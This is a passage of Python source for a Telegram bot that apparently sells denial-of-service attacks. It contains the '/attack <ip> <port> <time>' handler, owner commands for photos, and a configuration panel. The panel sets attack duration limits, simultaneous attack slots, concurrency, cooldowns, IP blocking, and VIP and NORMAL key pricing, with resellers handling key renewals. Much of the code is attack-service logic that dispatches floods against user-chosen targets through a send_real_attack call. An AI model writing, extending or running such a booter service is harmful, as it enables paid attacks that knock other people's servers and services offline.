    save_photo(section, file_id)

    section_labels = {
        'denied': '𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝',
        'attack': '𝐀𝐭𝐭𝐚𝐜𝐤 𝐒𝐭𝐚𝐫𝐭',
        'startsms': '𝐒𝐭𝐚𝐫𝐭 𝐌𝐞𝐬𝐬𝐚𝐠𝐞'
    }

    safe_send_message(
        message.chat.id,
        f"{HTML_EMOJI.CHECKMARK} <b>𝐏𝐡𝐨𝐭𝐨 𝐬𝐚𝐯𝐞𝐝 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲!</b>\n\n"
        f"{HTML_EMOJI.CAMERA} 𝐒𝐞𝐜𝐭𝐢𝐨𝐧: <b>{section_labels[section]}</b>\n"
        f"{HTML_EMOJI.KEY} 𝐊𝐞𝐲: <code>{section}</code>\n\n"
        f"{HTML_EMOJI.TIP} 𝐓𝐡𝐢𝐬 𝐩𝐡𝐨𝐭𝐨 𝐰𝐢𝐥𝐥 𝐧𝐨𝐰 𝐚𝐭𝐭𝐚𝐜𝐡 𝐭𝐨 𝐢𝐭𝐬 𝐜𝐨𝐫𝐫𝐞𝐬𝐩𝐨𝐧𝐝𝐢𝐧𝐠 𝐦𝐞𝐬𝐬𝐚𝐠𝐞.",
        reply_to=message
    )


@bot.message_handler(commands=["removephoto"])
def remove_photo_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()

    if len(command_parts) != 2:
        safe_send_message(
            message.chat.id,
            f"{HTML_EMOJI.CROSS} <b>𝐑𝐄𝐌𝐎𝐕𝐄 𝐏𝐇𝐎𝐓𝐎 𝐂𝐌𝐃 𝐅𝐎𝐑𝐌𝐀𝐓</b> {HTML_EMOJI.CROSS}\n\n"
            f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/removephoto &lt;denied|attack|startsms|all&gt;</code>\n\n"
            f"{HTML_EMOJI.LIST} <b>𝐎𝐩𝐭𝐢𝐨𝐧𝐬:</b>\n"
            f"• <code>denied</code> — 𝐑𝐞𝐦𝐨𝐯𝐞 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝 𝐩𝐡𝐨𝐭𝐨\n"
            f"• <code>attack</code> — 𝐑𝐞𝐦𝐨𝐯𝐞 𝐀𝐭𝐭𝐚𝐜𝐤 𝐒𝐭𝐚𝐫𝐭 𝐩𝐡𝐨𝐭𝐨\n"
            f"• <code>startsms</code> — 𝐑𝐞𝐦𝐨𝐯𝐞 𝐒𝐭𝐚𝐫𝐭 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐩𝐡𝐨𝐭𝐨\n"
            f"• <code>all</code> — 𝐑𝐞𝐦𝐨𝐯𝐞 𝐀𝐋𝐋 𝐩𝐡𝐨𝐭𝐨𝐬\n\n"
            f"{HTML_EMOJI.TIP} <b>𝐄𝐱𝐚𝐦𝐩𝐥𝐞:</b>\n"
            f"<code>/removephoto denied</code>\n"
            f"<code>/removephoto all</code>",
            reply_to=message
        )
        return

    section = command_parts[1].lower()

    if section == 'all':
        count = remove_all_photos()
        safe_send_message(
            message.chat.id,
            f"{HTML_EMOJI.CHECKMARK} <b>𝐀𝐥𝐥 𝐩𝐡𝐨𝐭𝐨𝐬 𝐫𝐞𝐦𝐨𝐯𝐞𝐝!</b>\n\n"
            f"{HTML_EMOJI.BAN} 𝐓𝐨𝐭𝐚𝐥 𝐫𝐞𝐦𝐨𝐯𝐞𝐝: <b>{count}</b>",
            reply_to=message
        )
        return

    if section not in ['denied', 'attack', 'startsms']:
        safe_send_message(
            message.chat.id,
            f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐬𝐞𝐜𝐭𝐢𝐨𝐧!</b>\n\n"
            f"{HTML_EMOJI.DOCUMENT} 𝐔𝐬𝐞: <code>denied</code>, <code>attack</code>, <code>startsms</code>, 𝐨𝐫 <code>all</code>",
            reply_to=message
        )
        return

    if remove_photo(section):
        safe_send_message(
            message.chat.id,
            f"{HTML_EMOJI.CHECKMARK} <b>𝐏𝐡𝐨𝐭𝐨 𝐫𝐞𝐦𝐨𝐯𝐞𝐝!</b>\n\n"
            f"{HTML_EMOJI.CAMERA} 𝐒𝐞𝐜𝐭𝐢𝐨𝐧: <b>{section}</b>",
            reply_to=message
        )
    else:
        safe_send_message(
            message.chat.id,
            f"{HTML_EMOJI.CROSS} <b>𝐍𝐨 𝐩𝐡𝐨𝐭𝐨 𝐟𝐨𝐮𝐧𝐝!</b>\n\n"
            f"{HTML_EMOJI.CAMERA} 𝐒𝐞𝐜𝐭𝐢𝐨𝐧: <b>{section}</b>\n\n"
            f"{HTML_EMOJI.TIP} 𝐔𝐬𝐞 <code>/addphoto {section}</code> 𝐭𝐨 𝐚𝐝𝐝 𝐨𝐧𝐞.",
            reply_to=message
        )


# ============ MAIN ATTACK HANDLER ============

@bot.message_handler(commands=["attack"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id

    is_group = message.chat.type in ['group', 'supergroup']
    group_id = message.chat.id if is_group else None

    if is_group:
        is_approved, group_config = is_group_approved(group_id)
        if not is_approved:
            send_with_photo_if_available(
                message.chat.id, 'denied',
                f"{HTML_EMOJI.WARNING} <b>𝐓𝐇𝐈𝐒 𝐆𝐑𝐎𝐔𝐏 𝐈𝐒 𝐍𝐎𝐓 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐅𝐎𝐑 𝐀𝐓𝐓𝐀𝐂𝐊</b>\n\n{HTML_EMOJI.PROFILE} 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐨𝐰𝐧𝐞𝐫 𝐭𝐨 𝐠𝐞𝐭 𝐭𝐡𝐢𝐬 𝐠𝐫𝐨𝐮𝐩 𝐚𝐩𝐩𝐫𝐨𝐯𝐞𝐝.",
                reply_to=message
            )
            return

        group_cooldown = get_group_cooldown(group_id)
        if group_cooldown > 0:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.TIMER} <b>𝐆𝐫𝐨𝐮𝐩 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐚𝐜𝐭𝐢𝐯𝐞!</b> 𝐖𝐚𝐢𝐭: {group_cooldown}s", reply_to=message)
            return

        if get_group_feedback_required(group_id) and has_pending_feedback(user_id, is_group, group_id):
            safe_send_message(message.chat.id, build_feedback_required_message(), reply_to=message)
            return

        group_max_slots = get_group_max_slots(group_id)
        with _attack_lock:
            used_in_group = 0
            for attack in active_attacks.values():
                if attack.get('group_id') == group_id and attack['end_time'] > datetime.now():
                    used_in_group += 1
            if used_in_group >= group_max_slots:
                safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐆𝐫𝐨𝐮𝐩 𝐦𝐚𝐱 𝐬𝐥𝐨𝐭𝐬 𝐫𝐞𝐚𝐜𝐡𝐞𝐝!</b> 𝐎𝐧𝐥𝐲 {group_max_slots} 𝐬𝐢𝐦𝐮𝐥𝐭𝐚𝐧𝐞𝐨𝐮𝐬 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 𝐚𝐥𝐥𝐨𝐰𝐞𝐝 𝐢𝐧 𝐭𝐡𝐢𝐬 𝐠𝐫𝐨𝐮𝐩.", reply_to=message)
                return

    if not is_group:
        if get_setting('feedback_required', True) and has_pending_feedback(user_id):
            safe_send_message(message.chat.id, build_feedback_required_message(), reply_to=message)
            return

        if not has_valid_key(user_id) and not is_owner(user_id):
            user = users_collection.find_one({'user_id': user_id})
            if user and user.get('reseller_username'):
                send_with_photo_if_available(
                    message.chat.id, 'denied',
                    f"{HTML_EMOJI.CROSS} <b>𝐊𝐞𝐲 𝐞𝐱𝐩𝐢𝐫𝐞𝐝!</b>\n\n{HTML_EMOJI.REFRESH} 𝐅𝐨𝐫 𝐫𝐞𝐧𝐞𝐰𝐚𝐥 𝐃𝐌: @{user.get('reseller_username')}",
                    reply_to=message
                )
            else:
                send_with_photo_if_available(message.chat.id, 'denied', build_access_denied_message(), reply_to=message)
            return

    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_send_message(
            message.chat.id,
            f"{HTML_EMOJI.ROCKET} <b>𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐅𝐎𝐑𝐌𝐀𝐓</b> {HTML_EMOJI.ROCKET}\n\n"
            f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n\n"
            f"{HTML_EMOJI.DOCUMENT} <b>𝐄𝐱𝐚𝐦𝐩𝐥𝐞:</b>\n"
            f"• <code>/attack 127.0.0.1 8080 60</code>\n\n"
            f"{HTML_EMOJI.BAN} <b>𝐋𝐢𝐦𝐢𝐭𝐬:</b>\n"
            f"• 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲: 𝐎𝐧𝐥𝐢𝐧𝐞\n"
            f"• 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐩𝐨𝐫𝐭𝐬: 443, 8700, 9031, 17500, 20000, 20001, 20002\n\n"
            f"{HTML_EMOJI.TIP} 𝐑𝐞𝐚𝐥-𝐭𝐢𝐦𝐞 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐬𝐡𝐨𝐰𝐧!",
            reply_to=message
        )
        return

    target, port, duration = command_parts[1], command_parts[2], command_parts[3]

    is_attacking, end_time = is_port_being_attacked(target, port)
    if is_attacking:
        remaining = int((end_time - datetime.now()).total_seconds())
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐏𝐨𝐫𝐭 {port} 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐛𝐞𝐢𝐧𝐠 𝐚𝐭𝐭𝐚𝐜𝐤𝐞𝐝 𝐨𝐧 {target}!</b>\n\n{HTML_EMOJI.TIMER} 𝐓𝐢𝐦𝐞 𝐫𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠: {remaining}s\n\n𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐟𝐨𝐫 𝐭𝐡𝐞 𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐨 𝐟𝐢𝐧𝐢𝐬𝐡 𝐛𝐞𝐟𝐨𝐫𝐞 𝐥𝐚𝐮𝐧𝐜𝐡𝐢𝐧𝐠 𝐚𝐧𝐨𝐭𝐡𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤 𝐨𝐧 𝐭𝐡𝐞 𝐬𝐚𝐦𝐞 𝐩𝐨𝐫𝐭.", reply_to=message)
        return

    if not validate_target(target):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐈𝐏!</b>", reply_to=message)
        return

    if is_ip_blocked(target):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝐈𝐏 {target} 𝐢𝐬 𝐛𝐥𝐨𝐜𝐤𝐞𝐝!</b> 𝐔𝐬𝐞 𝐚𝐧𝐨𝐭𝐡𝐞𝐫 𝐈𝐏.", reply_to=message)
        return

    try:
        port = int(port)
        if port < 1 or port > 65535:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐩𝐨𝐫𝐭!</b> (1-65535)", reply_to=message)
            return
        duration = int(duration)

        if duration < MIN_ATTACK_TIME and not is_owner(user_id):
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐌𝐢𝐧𝐢𝐦𝐮𝐦 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞 𝐢𝐬 {MIN_ATTACK_TIME} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬!</b>", reply_to=message)
            return

        if not is_group:
            user = users_collection.find_one({'user_id': user_id})
            key_type = user.get('key_type', 'NORMAL') if user else 'NORMAL'
            max_time = user.get('max_attack_time', get_key_max_attack(key_type)) if user else get_max_attack_time()
        else:
            max_time = get_group_max_attack_time(group_id)

        if not is_owner(user_id) and duration > max_time:
            if not is_group:
                safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐘𝐨𝐮𝐫 {key_type} 𝐤𝐞𝐲 𝐚𝐥𝐥𝐨𝐰𝐬 𝐦𝐚𝐱 {max_time}s 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞!</b>", reply_to=message)
            else:
                safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐌𝐚𝐱 𝐭𝐢𝐦𝐞 𝐟𝐨𝐫 𝐭𝐡𝐢𝐬 𝐠𝐫𝐨𝐮𝐩: {max_time}s</b>", reply_to=message)
            return

        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        slot_index = get_free_slot()

        if slot_index is None:
            busy_slots, free_slots, total_slots = get_slot_status()
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐌𝐚𝐱 𝐚𝐭𝐭𝐚𝐜𝐤 𝐥𝐢𝐦𝐢𝐭 𝐫𝐞𝐚𝐜𝐡𝐞𝐝!</b> 𝐀𝐥𝐥 {total_slots} 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐛𝐮𝐬𝐲.\n\n𝐏𝐥𝐞𝐚𝐬𝐞 𝐭𝐫𝐲 𝐚𝐠𝐚𝐢𝐧 𝐥𝐚𝐭𝐞𝐫.", reply_to=message)
            return

        with _attack_lock:
            if user_id not in user_attack_history:
                user_attack_history[user_id] = {}
            user_attack_history[user_id][f"{target}:{port}"] = datetime.now()

            api_in_use[attack_id] = slot_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration),
                'is_group': is_group,
                'group_id': group_id
            }
            active_port_attacks[attack_id] = f"{target}:{port}"

        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, slot_index, is_group, group_id))
        thread.daemon = True
        thread.start()

    except ValueError:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐏𝐨𝐫𝐭 𝐚𝐧𝐝 𝐭𝐢𝐦𝐞 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐧𝐮𝐦𝐛𝐞𝐫𝐬!</b>", reply_to=message)


def start_attack(target, port, duration, message, attack_id, api_index, is_group=False, group_id=None):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or str(user_id)

        log_attack(user_id, username, target, port, duration)

        if is_group:
            cooldown = get_group_cooldown_time(group_id) if group_id else get_user_cooldown_setting()
        else:
            cooldown = get_user_cooldown_setting()

        attack_msg = build_attack_start_message(target, port, duration, cooldown)
        send_with_photo_if_available(message.chat.id, 'attack', attack_msg, reply_to=message)

        concurrent_val = get_concurrent_limit()

        send_real_attack(target, port, duration, concurrent_val)

        def finish_attack():
            with _attack_lock:
                if attack_id in active_attacks:
                    del active_attacks[attack_id]
                if attack_id in api_in_use:
                    del api_in_use[attack_id]
                if attack_id in active_port_attacks:
                    del active_port_attacks[attack_id]

            if is_group and group_id:
                set_group_cooldown(group_id, get_group_cooldown_time(group_id))
            else:
                set_user_cooldown(user_id, get_user_cooldown_setting())

            complete_msg = build_attack_complete_message(target, port, duration)
            safe_send_message(message.chat.id, complete_msg, reply_to=message)

            if is_group:
                feedback_required = get_group_feedback_required(group_id) if group_id else get_setting('feedback_required', True)
            else:
                feedback_required = get_setting('feedback_required', True)

            if feedback_required:
                set_pending_feedback(user_id, target, port, duration, is_group, group_id)
            else:
                safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐘𝐨𝐮 𝐜𝐚𝐧 𝐧𝐨𝐰 𝐬𝐭𝐚𝐫𝐭 𝐚 𝐧𝐞𝐰 𝐚𝐭𝐭𝐚𝐜𝐤 𝐮𝐬𝐢𝐧𝐠 /attack 𝐜𝐨𝐦𝐦𝐚𝐧𝐝.</b>", reply_to=message)

        timer = threading.Timer(duration, finish_attack)
        timer.daemon = True
        timer.start()

    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
            if attack_id in active_port_attacks:
                del active_port_attacks[attack_id]
        print(f"Attack error: {e}")


# ============ CONFIGURATION COMMAND ============

@bot.message_handler(commands=["config"])
def config_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("⚙️ 𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐢𝐦𝐞", callback_data="config_maxtime"),
        InlineKeyboardButton("⏳ 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧", callback_data="config_cooldown"),
        InlineKeyboardButton("🎯 𝐌𝐚𝐱 𝐒𝐥𝐨𝐭𝐬", callback_data="config_slots"),
        InlineKeyboardButton("⚡ 𝐂𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭/𝐀𝐭𝐭𝐚𝐜𝐤", callback_data="config_concurrent"),
        InlineKeyboardButton("🚫 𝐁𝐥𝐨𝐜𝐤 𝐈𝐏", callback_data="config_blockip"),
        InlineKeyboardButton("✅ 𝐔𝐧𝐛𝐥𝐨𝐜𝐤 𝐈𝐏", callback_data="config_unblockip"),
        InlineKeyboardButton("📋 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐈𝐏𝐬", callback_data="config_listip"),
        InlineKeyboardButton("🔒 𝐏𝐨𝐫𝐭 𝐏𝐫𝐨𝐭𝐞𝐜𝐭𝐢𝐨𝐧", callback_data="config_portprotect"),
        InlineKeyboardButton("📸 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝", callback_data="config_feedback"),
        InlineKeyboardButton("💰 𝐕𝐈𝐏 𝐏𝐫𝐢𝐜𝐢𝐧𝐠", callback_data="config_vip_price"),
        InlineKeyboardButton("💰 𝐍𝐎𝐑𝐌𝐀𝐋 𝐏𝐫𝐢𝐜𝐢𝐧𝐠", callback_data="config_normal_price"),
        InlineKeyboardButton("👥 𝐆𝐫𝐨𝐮𝐩 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬", callback_data="config_group"),
        InlineKeyboardButton("🤖 𝐁𝐨𝐭 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬", callback_data="config_bot"),
        InlineKeyboardButton("🔧 𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞", callback_data="config_maintenance"),
        InlineKeyboardButton("📊 𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬", callback_data="config_view")
    )

    bot.reply_to(message, f"{HTML_EMOJI.SETTINGS} <b>𝐂𝐎𝐍𝐅𝐈𝐆𝐔𝐑𝐀𝐓𝐈𝐎𝐍 𝐏𝐀𝐍𝐄𝐋</b>\n\n𝐒𝐞𝐥𝐞𝐜𝐭 𝐚𝐧 𝐨𝐩𝐭𝐢𝐨𝐧 𝐭𝐨 𝐜𝐨𝐧𝐟𝐢𝐠𝐮𝐫𝐞:", reply_markup=markup, parse_mode="HTML")


@bot.callback_query_handler(func=lambda call: call.data.startswith("config_"))
def config_callback(call):
    # ZAROORI FIX: Answer query immediately
    bot.answer_callback_query(call.id)

    user_id = call.from_user.id

    if not is_owner(user_id):
        bot.send_message(call.message.chat.id, f"{HTML_EMOJI.CROSS} <b>Only owner can use this!</b>", parse_mode="HTML")
        return

    data = call.data

    if data == "config_maxtime":
        bot.edit_message_text(
            f"{HTML_EMOJI.SETTINGS} <b>𝐒𝐞𝐭 𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐢𝐦𝐞</b>\n\n𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐦𝐚𝐱𝐢𝐦𝐮𝐦 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞 𝐢𝐧 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.\n" +
            f"𝐂𝐮𝐫𝐫𝐞𝐧𝐭: {get_max_attack_time()} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>300</code>\n\n𝐓𝐲𝐩𝐞 /cancel 𝐭𝐨 𝐚𝐛𝐨𝐫𝐭.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, set_max_time_config)

    elif data == "config_cooldown":
        bot.edit_message_text(
            f"{HTML_EMOJI.TIMER} <b>𝐒𝐞𝐭 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐓𝐢𝐦𝐞</b>\n\n𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐭𝐢𝐦𝐞 𝐢𝐧 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.\n" +
            f"𝐂𝐮𝐫𝐫𝐞𝐧𝐭: {get_user_cooldown_setting()} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>180</code>\n\n𝐓𝐲𝐩𝐞 /cancel 𝐭𝐨 𝐚𝐛𝐨𝐫𝐭.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, set_cooldown_config)

    elif data == "config_slots":
        bot.edit_message_text(
            f"{HTML_EMOJI.TARGET} <b>𝐒𝐞𝐭 𝐌𝐚𝐱 𝐒𝐥𝐨𝐭𝐬 (𝐒𝐢𝐦𝐮𝐥𝐭𝐚𝐧𝐞𝐨𝐮𝐬 𝐀𝐭𝐭𝐚𝐜𝐤𝐬)</b>\n\n𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐧𝐮𝐦𝐛𝐞𝐫 𝐨𝐟 𝐬𝐢𝐦𝐮𝐥𝐭𝐚𝐧𝐞𝐨𝐮𝐬 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 𝐚𝐥𝐥𝐨𝐰𝐞𝐝.\n" +
            f"𝐂𝐮𝐫𝐫𝐞𝐧𝐭: {current_max_slots}\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>4</code>\n\n𝐓𝐲𝐩𝐞 /cancel 𝐭𝐨 𝐚𝐛𝐨𝐫𝐭.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, set_slots_config)

    elif data == "config_concurrent":
        bot.edit_message_text(
            f"{HTML_EMOJI.FIRE} <b>𝐒𝐞𝐭 𝐂𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐏𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤</b>\n\n𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐜𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐯𝐚𝐥𝐮𝐞 𝐟𝐨𝐫 𝐞𝐚𝐜𝐡 𝐀𝐏𝐈 𝐜𝐚𝐥𝐥.\n" +
            f"𝐂𝐮𝐫𝐫𝐞𝐧𝐭: {get_concurrent_limit()}\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>4</code>\n\n𝐓𝐲𝐩𝐞 /cancel 𝐭𝐨 𝐚𝐛𝐨𝐫𝐭.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, set_concurrent_config)

    elif data == "config_blockip":
        bot.edit_message_text(
            f"{HTML_EMOJI.BAN} <b>𝐁𝐥𝐨𝐜𝐤 𝐈𝐏</b>\n\n𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐈𝐏 𝐩𝐫𝐞𝐟𝐢𝐱 𝐭𝐨 𝐛𝐥𝐨𝐜𝐤.\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>20.204</code> (𝐛𝐥𝐨𝐜𝐤𝐬 𝐚𝐥𝐥 𝐈𝐏𝐬 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐰𝐢𝐭𝐡 20.204)\n\n𝐓𝐲𝐩𝐞 /cancel 𝐭𝐨 𝐚𝐛𝐨𝐫𝐭.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, block_ip_config)

    elif data == "config_unblockip":
        bot.edit_message_text(
            f"{HTML_EMOJI.CHECKMARK} <b>𝐔𝐧𝐛𝐥𝐨𝐜𝐤 𝐈𝐏</b>\n\n𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐈𝐏 𝐩𝐫𝐞𝐟𝐢𝐱 𝐭𝐨 𝐮𝐧𝐛𝐥𝐨𝐜𝐤.\n\n𝐔𝐬𝐞 /blockedips 𝐭𝐨 𝐬𝐞𝐞 𝐛𝐥𝐨𝐜𝐤𝐞𝐝 𝐩𝐫𝐞𝐟𝐢𝐱𝐞𝐬.\n\n𝐓𝐲𝐩𝐞 /cancel 𝐭𝐨 𝐚𝐛𝐨𝐫𝐭.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, unblock_ip_config)

    elif data == "config_listip":
        blocked = get_all_blocked_ips()
        if not blocked:
            response = f"{HTML_EMOJI.DOCUMENT} 𝐍𝐨 𝐈𝐏𝐬 𝐚𝐫𝐞 𝐛𝐥𝐨𝐜𝐤𝐞𝐝!"
        else:
            response = f"{HTML_EMOJI.BAN} <b>𝐁𝐋𝐎𝐂𝐊𝐄𝐃 𝐈𝐏𝐬</b>\n\n"
            for i, ip_data in enumerate(blocked, 1):
                response += f"{i}. <code>{ip_data['ip']}*</code>\n"
            response += f"\n{HTML_EMOJI.STATS} 𝐓𝐨𝐭𝐚𝐥: {len(blocked)}"

        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="HTML")

    elif data == "config_portprotect":
        current = get_setting('port_protection', True)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("✅ 𝐄𝐧𝐚𝐛𝐥𝐞" if not current else "🔴 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐎𝐍", callback_data="portprotect_on"),
            InlineKeyboardButton("❌ 𝐃𝐢𝐬𝐚𝐛𝐥𝐞" if current else "⚪ 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐎𝐅𝐅", callback_data="portprotect_off"),
            InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤", callback_data="config_back")
        )
        bot.edit_message_text(
            f"{HTML_EMOJI.LOCK} <b>𝐏𝐨𝐫𝐭 𝐏𝐫𝐨𝐭𝐞𝐜𝐭𝐢𝐨𝐧</b>\n\n𝐂𝐮𝐫𝐫𝐞𝐧𝐭: {'🟢 𝐄𝐍𝐀𝐁𝐋𝐄𝐃' if current else '🔴 𝐃𝐈𝐒𝐀𝐁𝐋𝐄𝐃'}\n\n𝐖𝐡𝐞𝐧 𝐞𝐧𝐚𝐛𝐥𝐞𝐝, 𝐬𝐚𝐦𝐞 𝐩𝐨𝐫𝐭 𝐜𝐚𝐧𝐧𝐨𝐭 𝐛𝐞 𝐚𝐭𝐭𝐚𝐜𝐤𝐞𝐝 𝐭𝐰𝐢𝐜𝐞 𝐬𝐢𝐦𝐮𝐥𝐭𝐚𝐧𝐞𝐨𝐮𝐬𝐥𝐲.",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="HTML"
        )

    elif data == "config_feedback":
        current = get_setting('feedback_required', True)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("✅ 𝐄𝐧𝐚𝐛𝐥𝐞" if not current else "🔴 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐎𝐍", callback_data="feedback_on"),
            InlineKeyboardButton("❌ 𝐃𝐢𝐬𝐚𝐛𝐥𝐞" if current else "⚪ 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐎𝐅𝐅", callback_data="feedback_off"),
            InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤", callback_data="config_back")
        )
        bot.edit_message_text(
